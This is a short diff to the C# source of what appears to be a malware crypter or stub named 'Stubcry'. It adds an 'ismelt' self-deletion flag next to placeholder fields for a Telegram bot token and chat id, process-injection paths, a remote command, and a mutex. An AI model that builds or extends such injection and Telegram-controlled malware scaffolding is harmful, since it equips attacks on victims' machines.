@@ -36,7 +36,7 @@ namespace Stubcry
         public static string bottoken = "$bottoken";
         public static string chatid = "$chatid";
         public static string nativeipath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "#NATIVEINJECTPATH");
-
+        public static bool ismelt = false;
         public static string dotnetipath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "#DOTNETINJECTPATH");
         public static string command = "$command";
         public static string Mutex = "$MUTEX";
